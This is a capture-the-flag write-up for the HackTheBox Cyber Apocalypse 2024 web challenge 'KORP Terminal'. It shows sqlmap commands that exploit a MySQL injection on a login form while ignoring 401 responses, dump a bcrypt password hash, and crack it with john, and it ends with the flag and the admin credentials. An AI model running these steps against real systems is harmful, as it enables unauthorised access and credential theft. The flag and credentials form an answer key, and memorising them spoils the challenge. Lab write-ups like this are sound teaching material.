---
name: KORP Terminal (2024)
event: HackTheBox Cyber Apocalypse CTF 2024
category: Web
description: Writeup for KORP Terminal (Web) - HackTheBox Cyber Apocalypse CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# KORP Terminal

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/-vhl8ixthO4/0.jpg)](https://www.youtube.com/watch?v=-vhl8ixthO4?t=375 "HackTheBox Cyber Apocalypse '24: KORP Terminal (web)")

## Description

> Your faction must infiltrate the KORP™ terminal and gain access to the Legionaries' privileged information and find out more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and security protocols.

## Solution

Greeted by a login page. If we send single quotes in username/password box it triggers a MySQL error 👀

Tried SQLMap but it fails due to `401: Unauthorized`.

Luckily, we can just ignore that HTTP code.

{% code overflow="wrap" %}
```bash
sqlmap -r new.req --batch --ignore-code 401

[INFO] POST parameter 'username' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
```
{% endcode %}

Find the databases.

{% code overflow="wrap" %}
```bash
sqlmap -r new.req --batch --ignore-code 401 --dbs

available databases [3]:
[*] information_schema
[*] korp_terminal
[*] test
```
{% endcode %}

Then the tables.

{% code overflow="wrap" %}
```bash
sqlmap -r new.req --batch --ignore-code 401 -D korp_terminal --tables

+-------+
| users |
+-------+
```
{% endcode %}

Dump the passwords.

{% code overflow="wrap" %}
```bash
sqlmap -r new.req --batch --ignore-code 401 -D korp_terminal -T users -C password --dump

+--------------------------------------------------------------+
| password                                                     |
+--------------------------------------------------------------+
| $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv. |
+--------------------------------------------------------------+
```
{% endcode %}

Crack the `bcrypt` hash with `john`.

{% code overflow="wrap" %}
```bash
john hash --wordlist=$rockyou

password123
```
{% endcode %}

Log in to the app and receive the flag.

{% code overflow="wrap" %}
```bash
admin:password123
```
{% endcode %}

Flag: `HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}`
